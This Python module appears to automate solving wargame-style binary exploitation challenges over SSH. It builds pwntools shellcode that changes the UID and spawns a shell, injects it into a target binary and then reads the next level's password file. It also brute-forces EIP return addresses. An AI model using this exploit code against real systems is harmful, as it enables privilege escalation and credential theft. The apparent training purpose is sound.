from time import sleep

from pwn import asm, shellcraft

from .ChallengeSSH import ChallengeSSH


class ChallengeBinary(ChallengeSSH):

    USER_ID_FORMAT = None       # Must be defined by subclass

    BINARY_TO_EXEC = None       # Must be defined by subclass

    def __init__(self, *args, **kwargs):
        assert(self.USER_ID_FORMAT is not None)
        assert(self.BINARY_TO_EXEC is not None)

        super().__init__(*args, **kwargs)

    @staticmethod
    def convert_addr_to_bytes_le(addr):
        if addr.startswith('0x'):
            addr = addr[2:]

        return bytes(bytearray.fromhex(addr)[::-1])

    @property
    def binary_to_exec(self):
        return self.BINARY_TO_EXEC % (self._id)

    @property
    def user_id(self):
        return self.USER_ID_FORMAT % (self._id)

    @property
    def user_id_next(self):
        return self.USER_ID_FORMAT % (self._id + 1)

    def get_shellcode(self, change_uid_func=None):
        assert(change_uid_func is None or
               isinstance(change_uid_func, str) or
               callable(change_uid_func))

        raw = ''

        if change_uid_func is not None:
            if isinstance(change_uid_func, str):
                func = getattr(shellcraft, change_uid_func)
            else:
                func = change_uid_func
            raw += func(self.user_id_next)

        raw += shellcraft.sh()

        return asm(raw)

    def exec_shellcode_to_get_pass(self, shellcode_payload, additionnal_params='',
                                   clear_env=False, waiting_for_shell=0.0):
        shellcode_payload = str(shellcode_payload).replace("'", '"')

        output = f'{self.remote_work_dir}/output'

        stdin, _, _ = self.exec_cmd_raw(f'''{self.binary_to_exec} $(python3 -c 'import sys; sys.stdout.buffer.write({shellcode_payload})') {additionnal_params} > {output}''', clear_env=clear_env)

        sleep(waiting_for_shell)

        stdin.write('echo ""\n')    # Start a new line
        stdin.write('whoami\n')     # Used to control that the privilege escalation was successful
        stdin.write(f'cat {self.next_pass_filename}\n')
        stdin.write('exit\n')
        stdin.flush()

        stdout, _ = self.exec_cmd(f'''cat {output}''')
        assert(len(stdout) >= 2), f'Unexpected output: {stdout}'

        whoami = stdout[-2].strip()
        passwd = stdout[-1].strip()

        assert(whoami == self.ssh_user_next), f'Unexpected whoami: {whoami} != {self.ssh_user_next}'

        return passwd

    def find_eip_addresses(self, payload_prefix, estimated_eip_address, payload_suffix = b'', additionnal_params='',
                           not_found_range=b'\x00\x10\x00\x00', found_count_max=1, clear_env=False):

        addr_int = int.from_bytes(estimated_eip_address, 'little')
        range_int = int.from_bytes(not_found_range, 'little')

        found = []

        try:
            for step in [1, -1]:
                for i, cur_addr in enumerate(range(addr_int, addr_int + (range_int * step), step)):
                    eip_address = self.convert_addr_to_bytes_le(hex(cur_addr))

                    step_str = 'FW' if step == 1 else 'BW'
                    self.log(f'    - ({step_str}) #{i:03} Trying with "{" ".join([f"0x{b:02x}" for b in eip_address])}"...', end='\r')

                    payload = payload_prefix + eip_address + payload_suffix
                    payload = str(payload).replace("'", '"')

                    stdin, stdout, _ = self.exec_cmd_raw(f'''{self.binary_to_exec} $(python3 -c 'import sys; sys.stdout.buffer.write({payload})') {additionnal_params}''', quiet=True, clear_env=clear_env)
                    while not stdout.channel.exit_status_ready():
                        sleep(.1)
                        if not stdin.channel.closed:
                            stdin.write('exit 42\n')
                            stdin.flush()

                    exit_code = stdout.channel.recv_exit_status()
                    if exit_code == 42:
                        found.append(eip_address)
                        if len(found) >= found_count_max:
                            # Max found reached, stop both loops
                            raise StopIteration
        except StopIteration:
            pass

        if len(found) == 0:
            raise RuntimeError('No EIP address found')

        if found_count_max == 1 and i == 0:
            msg = f'Estimated EIP address "{" ".join([f"0x{b:02x}" for b in estimated_eip_address])}" is correct'
        else:
            msg = f'EIP address(es) found: {found} (please select one of them to speed up the challenge)'

        self.log(f'    - {msg}' + ' ' * 100)

        return found
